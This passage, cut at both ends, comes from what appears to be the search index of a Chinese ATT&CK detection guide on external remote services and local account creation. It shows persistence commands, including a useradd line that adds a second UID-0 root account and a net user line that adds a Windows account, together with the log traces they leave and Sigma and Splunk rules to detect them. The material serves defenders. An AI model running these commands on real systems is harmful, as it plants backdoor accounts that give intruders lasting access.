\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\u6765\u68c0\u6d4b\u653b\u51fb\u8005\u5bf9\u6709\u6548\u5e10\u6237\u7684\u4f7f\u7528\uff0c\u4ee5\u5bf9\u8fdc\u7a0b\u670d\u52a1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6536\u96c6\u8eab\u4efd\u9a8c\u8bc1\u65e5\u5fd7\u5e76\u5206\u6790\u5f02\u5e38\u8bbf\u95ee\u6a21\u5f0f\uff0c\u6d3b\u52a8\u7a97\u53e3\u4ee5\u53ca\u6b63\u5e38\u5de5\u4f5c\u65f6\u95f4\u4e4b\u5916\u7684\u8bbf\u95ee\u3002 \u901a\u8fc7VPN\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u653b\u51fb\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u6848\u4f8b\uff0c\u4e0d\u5728\u4e00\u4e00\u63cf\u8ff0\u3002\u53ef\u5229\u7528\u7528\u6237\u8d26\u6237\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002\u8fdc\u7a0b\u684c\u9762\u3001SSH\u4e5f\u53ef\u6839\u636e\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1133 https://attack.mitre.org/techniques/T1133/","title":"T1133-\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#t1133-","text":"","title":"T1133-\u5916\u90e8\u8fdc\u7a0b\u670d\u52a1"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#attck","text":"VPN\uff0cCitrix\u548c\u5176\u4ed6\u8bbf\u95ee\u673a\u5236\u7b49\u8fdc\u7a0b\u670d\u52a1\u4f7f\u7528\u6237\u53ef\u4ee5\u4ece\u5916\u90e8\u4f4d\u7f6e\u8fde\u63a5\u5230\u5185\u90e8\u4f01\u4e1a\u7f51\u7edc\u8d44\u6e90\u3002\u7ecf\u5e38\u6709\u8fdc\u7a0b\u670d\u52a1\u7f51\u5173\u7ba1\u7406\u8fd9\u4e9b\u670d\u52a1\u7684\u8fde\u63a5\u548c\u51ed\u636e\u8eab\u4efd\u9a8c\u8bc1\u3002Windows Remote Management\u7b49\u670d\u52a1\u4e5f\u53ef\u4ee5\u5728\u5916\u90e8\u4f7f\u7528\u3002 \u653b\u51fb\u8005\u53ef\u4ee5\u4f7f\u7528\u8fdc\u7a0b\u670d\u52a1\u6765\u83b7\u5f97\u521d\u59cb\u8bbf\u95ee\u6743\u9650\uff0c\u4e5f\u53ef\u4ee5\u7528\u4f5c\u5728\u7f51\u5185\u7528\u4f5c\u6301\u4e45\u5316\u3002\u901a\u5e38\u9700\u8981\u8bbf\u95ee\u6709\u6548\u5e10\u6237\u624d\u80fd\u4f7f\u7528\u8be5\u670d\u52a1\uff0c\u53ef\u4ee5\u901a\u8fc7\u51ed\u636e\u7be1\u6539\u6216\u5728\u8fdb\u5165\u4f01\u4e1a\u7f51\u7edc\u4e4b\u540e\u4ece\u7528\u6237\u90a3\u91cc\u83b7\u53d6\u51ed\u636e\u6765\u83b7\u5f97\u6b64\u6743\u9650\u3002\u5728\u64cd\u4f5c\u8fc7\u7a0b\u4e2d\uff0c\u53ef\u4ee5\u5c06\u5bf9\u8fdc\u7a0b\u670d\u52a1\u7684\u8bbf\u95ee\u7528\u4f5c\u5197\u4f59\u8bbf\u95ee\u7684\u4e00\u90e8\u5206\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_1","text":"\u6309\u7167MITRE\u5b98\u65b9\u793a\u4f8b\uff0c\u50cfVPN\u3001\u8fdc\u7a0b\u684c\u9762\u3001SSH\u7b49\u90fd\u53ef\u4ee5\u5c5e\u4e8eT1133\u5916\u90e8\u8fdc\u7a0b\u8bbf\u95ee\u3002","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_2","text":"SSH\u65e5\u5fd7\u3001VPN\u65e5\u5fd7\u3001\u8fdc\u7a0b\u684c\u9762\u767b\u5f55\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_3","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_4","text":"\u6682\u65e0","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_5","text":"\u9075\u5faa\u6700\u4f73\u5b9e\u8df5\u6765\u68c0\u6d4b\u653b\u51fb\u8005\u5bf9\u6709\u6548\u5e10\u6237\u7684\u4f7f\u7528\uff0c\u4ee5\u5bf9\u8fdc\u7a0b\u670d\u52a1\u8fdb\u884c\u8eab\u4efd\u9a8c\u8bc1\u3002\u6536\u96c6\u8eab\u4efd\u9a8c\u8bc1\u65e5\u5fd7\u5e76\u5206\u6790\u5f02\u5e38\u8bbf\u95ee\u6a21\u5f0f\uff0c\u6d3b\u52a8\u7a97\u53e3\u4ee5\u53ca\u6b63\u5e38\u5de5\u4f5c\u65f6\u95f4\u4e4b\u5916\u7684\u8bbf\u95ee\u3002 \u901a\u8fc7VPN\u8fdb\u884c\u8fdc\u7a0b\u8bbf\u95ee\u653b\u51fb\uff0c\u7f51\u4e0a\u6709\u5f88\u591a\u6848\u4f8b\uff0c\u4e0d\u5728\u4e00\u4e00\u63cf\u8ff0\u3002\u53ef\u5229\u7528\u7528\u6237\u8d26\u6237\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002\u8fdc\u7a0b\u684c\u9762\u3001SSH\u4e5f\u53ef\u6839\u636e\u767b\u5f55\u5730\u70b9\u3001\u767b\u5f55\u65f6\u95f4\u4f5c\u4e3a\u68c0\u6d4b\u6761\u4ef6\u3002","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1133-%E5%A4%96%E9%83%A8%E8%BF%9C%E7%A8%8B%E6%9C%8D%E5%8A%A1/#_6","text":"MITRE-ATT&CK-T1133 https://attack.mitre.org/techniques/T1133/","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/","text":"T1136-001-linux-\u521b\u5efa\u7528\u6237 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u653b\u51fb\u8005\u62e5\u6709\u8db3\u591f\u7684\u8bbf\u95ee\u7ea7\u522b\u53ef\u4ee5\u521b\u5efa\u672c\u5730\u8d26\u6237\u6216\u8005\u57df\u8d26\u6237\u3002\u6b64\u7c7b\u8d26\u6237\u53ef\u4ee5\u7528\u4e8e\u6743\u9650\u7ef4\u6301\uff0c\u6301\u4e45\u6027\uff0c\u4e0d\u9700\u8981\u5728\u7cfb\u7edf\u4e0a\u90e8\u7f72\u540e\u95e8\u5de5\u5177\u6765\u5b9e\u73b0\u6743\u9650\u7ef4\u6301\u3002 \u8fd9\u4e9bNet user\u547d\u4ee4\u53ef\u7528\u4e8e\u521b\u5efa\u672c\u5730\u6216\u57df\u8d26\u6237\u3002 \u6d4b\u8bd5\u6848\u4f8b useradd -o -u 0 -g 0 -M -d / root -s / bin / bash\uff03{\u7528\u6237\u540d} \u68c0\u6d4b\u65e5\u5fd7 /var/log/auth.log \uff08\u5982\u679c\u53ef\u4ee5\u7684\u8bdd\uff0c\u6211\u66f4\u5e0c\u671b\u4f60\u80fd\u591f\u4f7f\u7528audit\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\uff0c\u5b83\u4f1a\u5f88\u65b9\u4fbf\uff09 \u6d4b\u8bd5\u590d\u73b0 icbc@icbc:/$ sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash abc(\u7528\u6237\u540d) icbc@icbc:/$ cat /etc/passwd root: x:0:0:root:/root:/bin/bash ...... abc: x:0:0:root:/root:/bin/bash \u6d4b\u8bd5\u7559\u75d5 icbc@icbc:/$sudo cat /var/log/auth.log Aug 9 13:42:33 icbc sudo: icbc : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 -M -d /root -s /bin/bash abc Aug 9 13:42:34 icbc sudo: pam_unix(sudo:session): session opened for user root by (uid=0) Aug 9 13:42:34 icbc useradd[18979]: new user: name=abc, UID=0, GID=0, home=/root, shell=/bin/bash \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Root Account Creation: index=linux source=\"/var/log/auth.log\" eventtype=useradd UID=0 OR GID=0 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1136-001 https://attack.mitre.org/techniques/T1136/001/ linux\u547d\u4ee4\u8be6\u89e3\u4e4buseradd\u547d\u4ee4\u4f7f\u7528\u65b9\u6cd5 https://blog.csdn.net/u011537073/article/details/51987121","title":"T1136-001-linux-\u521b\u5efa\u7528\u6237"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#t1136-001-linux-","text":"","title":"T1136-001-linux-\u521b\u5efa\u7528\u6237"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#attck","text":"\u653b\u51fb\u8005\u62e5\u6709\u8db3\u591f\u7684\u8bbf\u95ee\u7ea7\u522b\u53ef\u4ee5\u521b\u5efa\u672c\u5730\u8d26\u6237\u6216\u8005\u57df\u8d26\u6237\u3002\u6b64\u7c7b\u8d26\u6237\u53ef\u4ee5\u7528\u4e8e\u6743\u9650\u7ef4\u6301\uff0c\u6301\u4e45\u6027\uff0c\u4e0d\u9700\u8981\u5728\u7cfb\u7edf\u4e0a\u90e8\u7f72\u540e\u95e8\u5de5\u5177\u6765\u5b9e\u73b0\u6743\u9650\u7ef4\u6301\u3002 \u8fd9\u4e9bNet user\u547d\u4ee4\u53ef\u7528\u4e8e\u521b\u5efa\u672c\u5730\u6216\u57df\u8d26\u6237\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_1","text":"useradd -o -u 0 -g 0 -M -d / root -s / bin / bash\uff03{\u7528\u6237\u540d}","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_2","text":"/var/log/auth.log \uff08\u5982\u679c\u53ef\u4ee5\u7684\u8bdd\uff0c\u6211\u66f4\u5e0c\u671b\u4f60\u80fd\u591f\u4f7f\u7528audit\u65e5\u5fd7\u8fdb\u884c\u68c0\u6d4b\uff0c\u5b83\u4f1a\u5f88\u65b9\u4fbf\uff09","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_3","text":"icbc@icbc:/$ sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash abc(\u7528\u6237\u540d) icbc@icbc:/$ cat /etc/passwd root: x:0:0:root:/root:/bin/bash ...... abc: x:0:0:root:/root:/bin/bash","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_4","text":"icbc@icbc:/$sudo cat /var/log/auth.log Aug 9 13:42:33 icbc sudo: icbc : TTY=pts/0 ; PWD=/ ; USER=root ; COMMAND=/usr/sbin/useradd -o -u 0 -g 0 -M -d /root -s /bin/bash abc Aug 9 13:42:34 icbc sudo: pam_unix(sudo:session): session opened for user root by (uid=0) Aug 9 13:42:34 icbc useradd[18979]: new user: name=abc, UID=0, GID=0, home=/root, shell=/bin/bash","title":"\u6d4b\u8bd5\u7559\u75d5"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_5","text":"Root Account Creation: index=linux source=\"/var/log/auth.log\" eventtype=useradd UID=0 OR GID=0","title":"\u68c0\u6d4b\u89c4\u5219/\u601d\u8def"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-linux-%E5%88%9B%E5%BB%BA%E8%B4%A6%E6%88%B7/#_6","text":"MITRE-ATT&CK-T1136-001 https://attack.mitre.org/techniques/T1136/001/ linux\u547d\u4ee4\u8be6\u89e3\u4e4buseradd\u547d\u4ee4\u4f7f\u7528\u65b9\u6cd5 https://blog.csdn.net/u011537073/article/details/51987121","title":"\u53c2\u8003\u63a8\u8350"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/","text":"T1136-001-win-\u521b\u5efa\u672c\u5730\u8d26\u6237 \u6765\u81eaATT&CK\u7684\u63cf\u8ff0 \u5177\u6709\u8db3\u591f\u8bbf\u95ee\u7ea7\u522b\u6743\u9650\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u672c\u5730\u7cfb\u7edf\u6216\u57df\u8d26\u53f7\u3002\u6b64\u7c7b\u8d26\u53f7\u53ef\u7528\u4e8e\u6301\u4e45\u6027\uff0c\u4e0d\u9700\u8981\u5728\u7cfb\u7edf\u4e0a\u90e8\u7f72\u6301\u4e45\u6027\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u3002 \u5728\u4e91\u73af\u5883\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u521b\u5efa\u4ec5\u7528\u4e8e\u8bbf\u95ee\u7279\u5b9a\u670d\u52a1\u7684\u8d26\u6237\uff0c\u4ece\u800c\u51cf\u5c11\u88ab\u68c0\u6d4b\u5230\u7684\u53ef\u80fd\u3002 Windows \u53ef\u4f7f\u7528net user\u547d\u4ee4\u6765\u521b\u5efa\u672c\u5730\u6216\u57df\u8d26\u53f7\u3002 Office 365 \u6709\u6743\u8bbf\u95ee\u5168\u5c40\u7ba1\u7406\u5458\u8d26\u6237\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u5176\u4ed6\u8d26\u6237\uff0c\u5e76\u4e3a\u5176\u5206\u914d\u5168\u5c40\u7ba1\u7406\u5458\u89d2\u8272\u4ee5\u4fbf\u80fd\u6301\u4e45\u8bbf\u95eeOffice 365\u79df\u6237\u3002 \u6d4b\u8bd5\u6848\u4f8b \u5229\u7528Net user\u547d\u4ee4\u521b\u5efa\u672c\u5730\u7528\u6237 \u68c0\u6d4b\u65e5\u5fd7 windows \u5b89\u5168\u65e5\u5fd7 \u6d4b\u8bd5\u590d\u73b0 \u672c\u5730\u521b\u5efa\u8d26\u6237 Microsoft Windows [\u7248\u672c 6.1.7601] \u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Windows\\system32>net user admin.123 admin1 /add \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002 \u6d4b\u8bd5\u7559\u75d5 \u65e5\u5fd7\u540d\u79f0: Security \u6765\u6e90: Microsoft-Windows-Security-Auditing \u65e5\u671f: 2020/6/7 22:09:21 \u4e8b\u4ef6 ID: 4720 #\u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002 \u4efb\u52a1\u7c7b\u522b: \u7528\u6237\u5e10\u6237\u7ba1\u7406 \u7ea7\u522b: \u4fe1\u606f \u5173\u952e\u5b57: \u5ba1\u6838\u6210\u529f \u7528\u6237: \u6682\u7f3a \u8ba1\u7b97\u673a: 12306Br0-PC \u63cf\u8ff0: \u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002 \u4e3b\u9898: \u5b89\u5168 ID: 12306Br0-PC\\12306Br0 \u5e10\u6237\u540d: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x75a8e \u65b0\u5e10\u6237: \u5b89\u5168 ID: 12306Br0-PC\\admin.123 \u5e10\u6237\u540d: admin.123 \u5e10\u6237\u57df: 12306Br0-PC \u5c5e\u6027: SAM \u5e10\u6237\u540d: admin.123 \u663e\u793a\u540d\u79f0: <\u672a\u8bbe\u7f6e\u503c> \u7528\u6237\u4e3b\u4f53\u540d\u79f0: - \u4e3b\u76ee\u5f55: <\u672a\u8bbe\u7f6e\u503c> \u4e3b\u9a71\u52a8\u5668: <\u672a\u8bbe\u7f6e\u503c> \u811a\u672c\u8def\u5f84: <\u672a\u8bbe\u7f6e\u503c> \u914d\u7f6e\u6587\u4ef6\u8def\u5f84: <\u672a\u8bbe\u7f6e\u503c> \u7528\u6237\u5de5\u4f5c\u7ad9: <\u672a\u8bbe\u7f6e\u503c> \u4e0a\u6b21\u8bbe\u7f6e\u7684\u5bc6\u7801:<\u4ece\u4e0d> \u5e10\u6237\u8fc7\u671f: <\u4ece\u4e0d> \u4e3b\u8981\u7ec4 ID: 513 \u5141\u8bb8\u59d4\u6258\u7ed9: - \u65e7 UAC \u503c: 0x0 \u65b0 UAC \u503c: 0x15 \u7528\u6237\u5e10\u6237\u63a7\u5236: \u5df2\u7981\u7528\u7684\u5e10\u6237 '\u4e0d\u8981\u6c42\u5bc6\u7801' - \u5df2\u542f\u7528 '\u666e\u901a\u5e10\u6237' - \u5df2\u542f\u7528 \u7528\u6237\u53c2\u6570: <\u672a\u8bbe\u7f6e\u503c> SID \u5386\u53f2: - \u767b\u5f55\u65f6\u95f4(\u4ee5\u5c0f\u65f6\u8ba1):\u5168\u90e8 \u9644\u52a0\u4fe1\u606f: \u7279\u6743 - \u4e8b\u4ef6 Xml: <Event xmlns=\"http://schemas.microsoft.com/win/2004/08/events/event\"> <System> <Provider Name=\"Microsoft-Windows-Security-Auditing\" Guid=\"{54849625-5478-4994-A5BA-3E3B0328C30D}\" /> <EventID>4720</EventID> <Version>0</Version> <Level>0</Level> <Task>13824</Task> <Opcode>0</Opcode> <Keywords>0x8020000000000000</Keywords> <TimeCreated SystemTime=\"2020-06-07T14:09:21.622933400Z\" /> <EventRecordID>3893</EventRecordID> <Correlation /> <Execution ProcessID=\"504\" ThreadID=\"2080\" /> <Channel>Security</Channel> <Computer>12306Br0-PC</Computer> <Security /> </System> <EventData> <Data Name=\"TargetUserName\">admin.123</Data> <Data Name=\"TargetDomainName\">12306Br0-PC</Data> <Data Name=\"TargetSid\">S-1-5-21-3579006141-3881886638-2121494774-1001</Data> <Data Name=\"SubjectUserSid\">S-1-5-21-3579006141-3881886638-2121494774-1000</Data> <Data Name=\"SubjectUserName\">12306Br0</Data> <Data Name=\"SubjectDomainName\">12306Br0-PC</Data> <Data Name=\"SubjectLogonId\">0x75a8e</Data> <Data Name=\"PrivilegeList\">-</Data> <Data Name=\"SamAccountName\">admin.123</Data> <Data Name=\"DisplayName\">%%1793</Data> <Data Name=\"UserPrincipalName\">-</Data> <Data Name=\"HomeDirectory\">%%1793</Data> <Data Name=\"HomePath\">%%1793</Data> <Data Name=\"ScriptPath\">%%1793</Data> <Data Name=\"ProfilePath\">%%1793</Data> <Data Name=\"UserWorkstations\">%%1793</Data> <Data Name=\"PasswordLastSet\">%%1794</Data> <Data Name=\"AccountExpires\">%%1794</Data> <Data Name=\"PrimaryGroupId\">513</Data> <Data Name=\"AllowedToDelegateTo\">-</Data> <Data Name=\"OldUacValue\">0x0</Data> <Data Name=\"NewUacValue\">0x15</Data> <Data Name=\"UserAccountControl\"> %%2080 %%2082 %%2084</Data> <Data Name=\"UserParameters\">%%1793</Data> <Data Name=\"SidHistory\">-</Data> <Data Name=\"LogonHours\">%%1797</Data> </EventData> </Event> \u68c0\u6d4b\u89c4\u5219/\u601d\u8def Sigma\u89c4\u5219 title: \u672c\u5730\u7528\u6237\u521b\u5efa description: \u68c0\u6d4bWindows\u670d\u52a1\u5668\u4e0a\u7684\u672c\u5730\u7528\u6237\u521b\u5efa\uff0c\u8fd9\u5728Active Directory\u73af\u5883\u4e2d\u4e0d\u9002\u7528\u3002\u4f7f\u7528\u672c\u5730\u65e5\u5fd7\uff0c\u975eAD\u65e5\u5fd7\u3002 status: \u6d4b\u8bd5\u9636\u6bb5 tags: - attack.persistence - attack.t1136-001 references: - https://patrick-bareiss.com/detecting-local-user-creation-in-ad-with-sigma/ author: 12306Br0(\u7ffb\u8bd1) date: 2020/06/07 logsource: product: windows service: security detection: selection: EventID: 4720 #\u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002 condition: selection fields: - EventCode - AccountName - AccountDomain falsepositives: - \u57df\u63a7\u5236\u5668\u65e5\u5fd7 - \u7531\u7279\u6743\u5e10\u6237\u7ba1\u7406\u5de5\u5177\u7ba1\u7406\u7684\u672c\u5730\u5e10\u6237 level: low \u9664\u4e86\u57fa\u4e8e\u4e8b\u4ef6ID4720\u8fdb\u884c\u68c0\u6d4b\u5916\uff0c\u8fd8\u53ef\u4ee5\u7528\u4e8b\u4ef6ID4688\u8fdb\u7a0b\u547d\u4ee4\u884c\u53c2\u6570\uff08net user\uff09\u6765\u8fdb\u884c\u68c0\u6d4b\u3002 Splunk\u89c4\u5219 EventID=\"4720\" | table EventCode,AccountName,AccountDomain \u5efa\u8bae \u5efa\u8bae\u6839\u636e4688\u8fdb\u7a0b\u548c\u547d\u4ee4\u884c\u53c2\u6570\u4ee5\u53ca4720\u76f8\u4e92\u7ed3\u5408\u8fdb\u884c\u68c0\u6d4b\u672c\u5730\u7528\u6237\u521b\u5efa\u884c\u4e3a\u3002 \u53c2\u8003\u63a8\u8350 MITRE-ATT&CK-T1136-001 https://attack.mitre.org/techniques/T1136/001/ Local User Creation https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_user_creation.yml","title":"T1136-001-win-\u521b\u5efa\u672c\u5730\u8d26\u6237"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#t1136-001-win-","text":"","title":"T1136-001-win-\u521b\u5efa\u672c\u5730\u8d26\u6237"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#attck","text":"\u5177\u6709\u8db3\u591f\u8bbf\u95ee\u7ea7\u522b\u6743\u9650\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u672c\u5730\u7cfb\u7edf\u6216\u57df\u8d26\u53f7\u3002\u6b64\u7c7b\u8d26\u53f7\u53ef\u7528\u4e8e\u6301\u4e45\u6027\uff0c\u4e0d\u9700\u8981\u5728\u7cfb\u7edf\u4e0a\u90e8\u7f72\u6301\u4e45\u6027\u8fdc\u7a0b\u8bbf\u95ee\u5de5\u5177\u3002 \u5728\u4e91\u73af\u5883\u4e2d\uff0c\u653b\u51fb\u8005\u53ef\u80fd\u4f1a\u521b\u5efa\u4ec5\u7528\u4e8e\u8bbf\u95ee\u7279\u5b9a\u670d\u52a1\u7684\u8d26\u6237\uff0c\u4ece\u800c\u51cf\u5c11\u88ab\u68c0\u6d4b\u5230\u7684\u53ef\u80fd\u3002","title":"\u6765\u81eaATT&amp;CK\u7684\u63cf\u8ff0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#windows","text":"\u53ef\u4f7f\u7528net user\u547d\u4ee4\u6765\u521b\u5efa\u672c\u5730\u6216\u57df\u8d26\u53f7\u3002","title":"Windows"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#office-365","text":"\u6709\u6743\u8bbf\u95ee\u5168\u5c40\u7ba1\u7406\u5458\u8d26\u6237\u7684\u653b\u51fb\u8005\u53ef\u4ee5\u521b\u5efa\u5176\u4ed6\u8d26\u6237\uff0c\u5e76\u4e3a\u5176\u5206\u914d\u5168\u5c40\u7ba1\u7406\u5458\u89d2\u8272\u4ee5\u4fbf\u80fd\u6301\u4e45\u8bbf\u95eeOffice 365\u79df\u6237\u3002","title":"Office 365"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_1","text":"\u5229\u7528Net user\u547d\u4ee4\u521b\u5efa\u672c\u5730\u7528\u6237","title":"\u6d4b\u8bd5\u6848\u4f8b"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_2","text":"windows \u5b89\u5168\u65e5\u5fd7","title":"\u68c0\u6d4b\u65e5\u5fd7"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_3","text":"","title":"\u6d4b\u8bd5\u590d\u73b0"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_4","text":"Microsoft Windows [\u7248\u672c 6.1.7601] \u7248\u6743\u6240\u6709 (c) 2009 Microsoft Corporation\u3002\u4fdd\u7559\u6240\u6709\u6743\u5229\u3002 C:\\Windows\\system32>net user admin.123 admin1 /add \u547d\u4ee4\u6210\u529f\u5b8c\u6210\u3002","title":"\u672c\u5730\u521b\u5efa\u8d26\u6237"},{"location":"0x5_%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/T1136-001-win-%E5%88%9B%E5%BB%BA%E6%9C%AC%E5%9C%B0%E8%B4%A6%E6%88%B7/#_5","text":"\u65e5\u5fd7\u540d\u79f0: Security \u6765\u6e90: Microsoft-Windows-Security-Auditing \u65e5\u671f: 2020/6/7 22:09:21 \u4e8b\u4ef6 ID: 4720 #\u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002 \u4efb\u52a1\u7c7b\u522b: \u7528\u6237\u5e10\u6237\u7ba1\u7406 \u7ea7\u522b: \u4fe1\u606f \u5173\u952e\u5b57: \u5ba1\u6838\u6210\u529f \u7528\u6237: \u6682\u7f3a \u8ba1\u7b97\u673a: 12306Br0-PC \u63cf\u8ff0: \u5df2\u521b\u5efa\u7528\u6237\u5e10\u6237\u3002 \u4e3b\u9898: \u5b89\u5168 ID: 12306Br0-PC\\12306Br0 \u5e10\u6237\u540d: 12306Br0 \u5e10\u6237\u57df: 12306Br0-PC \u767b\u5f55 ID: 0x75a8e \u65b0\u5e10\u6237: \u5b89\u5168 ID: 12306Br0-PC\\admin.123 \u5e10\u6237\u540d: admin.123 \u5e10\u6237\u57df: 12306Br0-PC \u5c5e\u6027: SAM \u5e10\u6237\u540d: admin.123 \u663e\u793a\u540d\u79f0: <\u672a\u8bbe\u7f6e\u503c> \u7528\u6237\u4e3b\u4f53\u540d\u79f0: - \u4e3b\u76ee\u5f55: <\u672a\u8bbe\u7f6e\u503c> \u4e3b\u9a71\u52a8\u5668: <\u672a\u8bbe\u7f6e\u503c> \u811a\u672c\u8def\u5f84: <\u672a\u8bbe\u7f6e\u503c> \u914d\u7f6e\u6587\u4ef6\u8def\u5f84: <\u672a\u8bbe\u7f6e\u503c> 